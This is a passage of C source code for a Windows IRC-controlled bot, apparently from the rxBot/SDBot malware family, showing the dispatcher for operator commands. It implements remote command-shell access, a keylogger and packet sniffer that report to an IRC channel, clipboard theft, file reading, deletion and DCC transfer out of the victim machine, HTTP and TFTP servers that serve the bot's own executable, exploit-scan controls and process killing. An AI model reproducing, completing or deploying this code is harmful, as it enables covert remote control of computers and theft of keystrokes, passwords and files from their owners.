				if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id)) {
					while (secure.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start secure thread, error %d",  mn_title, GetLastError());
				addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(httpstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Server",HTTP_THREAD,a[s+1]);
				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(logstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Log list",LOG_THREAD,a[s+1]);
				addlog(sendbuf);
				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_TFTPD
			else if (strcmp(tftpstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Server",TFTP_THREAD,a[s+1]);
				addlog(sendbuf);
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
			else if (strcmp(procsstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Process list",PROC_THREAD,a[s+1]);
				addlog(sendbuf);
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(securestop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Secure",SECURE_THREAD,a[s+1]);
				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(scanstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Scan",SCAN_THREAD,a[s+1]);
				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(scanstats_cmd, a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(reconnect_cmd, a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("Reconnecting");

				return 0;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(disconnect_cmd, a[s]) == 0) {
				irc_sendv(sock, "QUIT :disconnecting\r\n");
				addlog("Disconnecting");

				return -1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(quit_cmd, a[s]) == 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else 
					irc_sendv(sock, "QUIT :later\r\n"); 

				return -2;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(status_cmd, a[s]) == 0) {
				sprintf(sendbuf, "%s Status: Ready. Bot Uptime: %s",  mn_title, Uptime(started));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(botid_cmd, a[s]) == 0) {
				sprintf(sendbuf, "%s Bot ID: %s",  mn_title, botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(reboot_cmd, a[s]) == 0) {
				sprintf(sendbuf, ((Reboot())?("Rebooting system"):("Failed to reboot system")));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(threads_cmd, a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "List threads");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start list thread, error %d",  mn_title, GetLastError());
				addlog(sendbuf);
	
				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(aliases_cmd, a[s]) == 0) {
				aliaslist(sock, a[2], notice);
				addlog("Alias list");

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(log_cmd, a[s]) == 0) {
				SHOWLOG showlog;
				showlog.filter[0] = '\0';
				if (x != NULL && a[s+1]) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) 
						_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
				}
				_snprintf(showlog.chan, sizeof(showlog.chan), a[2]);
				showlog.sock = sock;
				showlog.notice = notice;
				showlog.silent = silent;

				sprintf(sendbuf, "Listing log");
				showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
				if (threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (LPVOID)&showlog, 0, &id)) {
					while (showlog.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("%s Failed to start listing thread, error %d",  mn_title, GetLastError());

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(clearlog_cmd, a[s]) == 0) {
				clearlog(sock, a[2], notice, silent);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_NETINFO
			else if (strcmp(netinfo_cmd, a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				addlog("Network Info");

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SYSINFO
			else if (strcmp(systeminfo_cmd, a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("System Info");

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(removebot_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "Removing Bot",notice);
#ifdef DEBUG_LOGGING
				closedebuglog();
#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
			else if (strcmp(procs_cmd, a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "Already running", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"%s Proccess list",mn_title);
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start listing thread, error %d ", mn_title,GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(uptime_cmd, a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]); 
			   
				if (total/86400 >= uptime || uptime == -1) { 
					sprintf(sendbuf, "%s Uptime: %s", mn_title,Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				} 

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(driveinfo_cmd, a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(testdlls_cmd, a[s]) == 0) {
				CheckDLLs(sock,a[2],notice,silent);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifdef DUMP_ENCRYPT
			else if (strcmp(encrypt_cmd, a[s]) == 0) {
				encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REMOTECMD
			else if (strcmp(opencmd_cmd, a[s]) == 0) {
				if (findthreadid(RCMD_THREAD) > 0) {
					sprintf(sendbuf ,"%s Remote shell already running",mn_title);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				} else {
					if (open_cmd(sock,a[2]) == -1) 
						sprintf(sendbuf,"%s Couldn't open remote shell",mn_title);
					else 
						sprintf(sendbuf,"%s Remote shell ready",mn_title);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}

				return 1;
			}
			else if (strcmp(cmdstop_cmd, a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"","Remote shell",RCMD_THREAD,a[s+1]);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(who_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				addlog("Login list complete");
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(getclipboard_cmd, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "", notice);
				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				addlog("Get Clipboard");

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(flusharp_cmd, a[s]) == 0) {
				if (FlushARPCache())
					_snprintf(sendbuf,sizeof(sendbuf),"%s ARP cache flushed",mn_title);
				else
					_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to flush ARP cache",mn_title);
				
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(flushdns_cmd, a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"%s DNS cache flushed",mn_title);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to flush DNS cache",mn_title);
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"%s Failed to load dnsapi.dll",mn_title);

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(currentip_cmd, a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_HTTPD
			else if (strcmp(httpserver_cmd, a[s]) == 0) {
				HTTPD httpd;
				httpd.port = ((a[s+1])?((atoi(a[s+1])==0)?(httpport):(atoi(a[s+1]))):(httpport));
				httpd.enabled = ((parameters['d'])?(FALSE):(TRUE));
				if (a[s+2])
					sprintf(httpd.dir, a[s+2]);
				else {
					char sysdir[MAX_PATH], drive[10];
					GetSystemDirectory(sysdir,sizeof(sysdir));
					_splitpath(sysdir, drive, NULL, NULL, NULL);
				}
				if (httpd.dir[strlen(httpd.dir)-1] == 92) 
					httpd.dir[strlen(httpd.dir)-1] = '\0';
				httpd.sock = sock;
				_snprintf(httpd.chan, sizeof(httpd.chan), a[2]);
				httpd.notice = notice;
				httpd.silent = silent;

				sprintf(sendbuf,"%s Server listening on IP: %s:%d, Directory: %s\\.", mn_title,GetIP(sock), httpd.port, httpd.dir);
				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {	
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start server thread, error %d", mn_title,GetLastError());

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_TFTPD
			else if (strcmp(tftpserver_cmd, a[s]) == 0) {
				if (findthreadid(TFTP_THREAD) > 0)
					sprintf(sendbuf ,"%s Already running",mn_title);
				else {
					TFTP tftp;
					(a[s+1])?(_snprintf(tftp.filename, sizeof(tftp.filename), a[s+1])):(GetModuleFileName(0,tftp.filename,sizeof(tftp.filename)));
					_snprintf(tftp.requestname, sizeof(tftp.requestname), ((a[s+2])?(a[s+2]):(filename)));
					tftp.port = tftpport;
					tftp.threads = 0;
					tftp.sock = sock;
					strncpy(tftp.chan, a[2], sizeof(tftp.chan)-1);
					tftp.notice = notice;
					tftp.silent = silent;

					sprintf(sendbuf, "%s TfTp Server started on Port: %d, File: %s, Request: %s", mn_title,tftp.port, tftp.filename, tftp.requestname);
					tftp.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
					if (threads[tftp.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftp, 0, &id)) {
						while (tftp.gotinfo == FALSE) 
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start server thread, error %d", mn_title,GetLastError());
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_CRASH
			else if (strcmp(crash_cmd, a[s]) == 0) {
				sprintf(sendbuf,"%s Crashing bot",mn_title);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				
				strcmp(a[s+5],"crash"); 

				return 1;
			}
#endif
			#ifndef NO_PATCHER
		//else if (strcmp(a[0], "patch") == 0)
		  else if (strcmp(patch_cmd, a[s]) == 0)
			
		{
			if (!checkos())
				return 1;

			PATCHER patcher;
			patcher.Sock = sock;
			patcher.Silent = silent;
			patcher.GotInfo = FALSE;
			//patcher.ThreadNum = addthread(PATCHER_THREAD);
			patcher.ThreadNum = addthread(sendbuf,PATCHER_THREAD,NULL);
			threads[patcher.ThreadNum].tHandle = CreateThread(NULL, 0, &PatcherThread, (LPVOID)&patcher, 0, &id);
			while (patcher.GotInfo == FALSE)
				Sleep(30);

			return 1;
		}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(currentthreads_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				sprintf(sendbuf ,"%s Currently %d Threads", mn_title,scanthreads);
				irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(myip_cmd, a[s]) == 0) {
				sprintf(sendbuf ,"%s %s", mn_title,GetIP(sock));
				irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}


//////////////////////////////////////////////////////////////////////////////////
//                  commands requiring at least 1 parameter                     //
//////////////////////////////////////////////////////////////////////////////////
			else if (a[s+1] == NULL) return 1;
			else if (strcmp(nick_cmd, a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				addlogv("Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(join_cmd, a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(part_cmd, a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(raw_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						addlogv("IRC Raw: %s",y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(killthreads_cmd, a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"%s Stopped: %d thread(s)", mn_title,i);
					else
						sprintf(sendbuf,"%s No active threads found",mn_title);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"%s Killed thread: %s",mn_title,a[i]);
						else 
							sprintf(sendbuf,"%s Failed to kill thread: %s",mn_title,a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(prefix_cmd, a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"%s Prefix changed to: '%c'",mn_title,a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(openfile_cmd, a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,"%s File opened: %s ", mn_title,a[s+1]);
				else
					sprintf(sendbuf,"%s Couldn't open file: %s", mn_title,a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(server_cmd, a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"%s Server changed to: '%s'",mn_title,a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(dnslookup_cmd, a[s]) == 0) {
				LPHOSTENT hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = finet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL)
						sprintf(sendbuf, "%s Lookup: %s -> %s", mn_title,a[s+1], hostent->h_name);
				}
				else {
					hostent = fgethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s Lookup: %s -> %s", mn_title,a[s+1], finet_ntoa(iaddr));
					}
				}
				if (hostent == NULL)
					sprintf(sendbuf,"%s Couldn't resolve hostname",mn_title);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PROCESS
			else if (strcmp(killproc_cmd, a[s]) == 0) {
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"%s Process killed: %s",mn_title,a[s+1]);
				else
					sprintf(sendbuf,"%s Failed to terminate process: %s", mn_title,a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp(killid_cmd, a[s]) == 0) {
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"%s Process killed ID: %s",mn_title,a[s+1]);
				else
					sprintf(sendbuf,"%s Failed to terminate process ID: %s", mn_title,a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(delete_cmd, a[s]) == 0) { 
				if (DeleteFile(a[s+1])) 
					_snprintf(sendbuf,sizeof(sendbuf),"%s Deleted '%s'",mn_title,a[s+1]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError(""));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DCC
			else if (strcmp(dccget_cmd, a[s]) == 0) {
				DCC dcc;
				memset(dcc.host,0,sizeof(dcc.host));
				sprintf(dcc.filename,"%s",a[s+1]);

			    dcc.sock = sock;
				_snprintf(dcc.sendto,sizeof(dcc.sendto),user);
				dcc.notice = notice;
				dcc.silent = silent;

				sprintf(sendbuf,"%s Send File: %s, User: %s",mn_title,dcc.filename,dcc.sendto);
				dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
				if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCSendThread, (LPVOID)&dcc, 0, &id)) {
					while (dcc.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start transfer thread, error %d", mn_title,GetLastError());
				addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(list_cmd, a[s]) == 0) { 
				GetFiles(a[s+1],sock,a[2],NULL);
				addlogv("List: %s", a[s+1]);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(mirccmd_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"%s Client not open",mn_title);
						else
							sprintf(sendbuf,"%s Command sent",mn_title);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
                }

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REMOTECMD
			else if (strcmp(remotecmd_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) { 
						strcat(y,"\n");
						if (!send_commands(y)) {
							sprintf(sendbuf,"%s Error sending to remote shell",mn_title);
							if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						}
						else
							sprintf(sendbuf,"%s Commands: %s",mn_title,y);
						addlog(sendbuf);
					}
				}
				
				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
				else if (strcmp(readfile_cmd, a[s]) == 0) {
				FILE *fp;
				if ((fp = fopen(a[s+1],"r")) != NULL) {
					while (fgets(sendbuf,sizeof(sendbuf),fp) != NULL)
						irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
					fclose(fp);
					sprintf(sendbuf,"%s Read file complete: %s",mn_title,a[s+1]);
				} else {
					sprintf(sendbuf,"%s Read file failed: %s",mn_title,a[s+1]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				}
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
//#ifndef NO_AIM
//				else if (strcmp(aim_cmd, a[s]) == 0) {
//					int Aen = s+1;
//					strcpy(AIMmesg, "");
//					while (a[Aen]) {
//						sprintf(AIMmesg, "%s %s", AIMmesg, a[Aen]);
//						Aen++;
//					}
//					EnumWindows(EnumAIM, 0);
//				}
//#endif
///	///////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_IDENT
				else if (strcmp(ident_cmd, a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"%s Already running",mn_title);
					else {
						sprintf(sendbuf,"%s Server running on Port: 113",mn_title);
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"%s Failed to start server, error %d", mn_title,GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"%s Server stopped. (%d thread(s) stopped)",mn_title,i);
					else
						sprintf(sendbuf,"%s No thread found",mn_title);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSNIFF
			else if (strcmp("psniff", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(PSNIFF_THREAD) > 0)
						sprintf(sendbuf ,"[PSNIFF]: Already running.");
					else {
						PSNIFF sniff;
						sniff.sock = sock;
						sniff.notice = notice;
						sniff.silent = silent;
						_snprintf(sniffchan, sizeof(sniffchan), ((a[s+2])?(a[s+2]):((strcmp(sniffchan,"")==0)?(a[2]):(sniffchan))));

						sprintf(sendbuf, "[PSNIFF]: Carnivore packet sniffer active.");
						sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
						if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SniffThread, (LPVOID)&sniff, 0, &id)) {
							while(sniff.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[PSNIFF]: Failed to start sniffer thread, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(PSNIFF_THREAD)) > 0)
						sprintf(sendbuf,"[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[PSNIFF]: No Carnivore thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
#ifndef NO_KEYLOG
			else if (strcmp(keylog_cmd, a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0 || strcmp("file", a[s+1]) == 0) {
					if (findthreadid(KEYLOG_THREAD) > 0)
						sprintf(sendbuf ,"[KEYLOG]: Already running.");
					else {
						KEYLOG keylog;
						keylog.sock = sock;
						keylog.notice = notice;
						keylog.silent = ((strcmp("file", a[s+1]) == 0)?(TRUE):(silent));
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));

						sprintf(sendbuf, "[KEYLOG]: Key logger active.");
						keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
						if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
							while(keylog.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[KEYLOG]: Failed to start logging thread, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(KEYLOG_THREAD)) > 0)
						sprintf(sendbuf,"[KEYLOG]: Key logger stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[KEYLOG]: No key logger thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
#ifndef NO_NET
			else if (strcmp(net_cmd, a[s]) == 0) {
				if((!noadvapi32) || (!nonetapi32)) {
					if (x != NULL) {
						char *y = NULL;
						if (a[s+2]) 
							y = strstr(x, a[s+2]);
						if (strcmp("start", a[s+1]) == 0)
							if (a[s+2])
								sprintf(sendbuf, "%s", Services(NET_START, y));
							else {
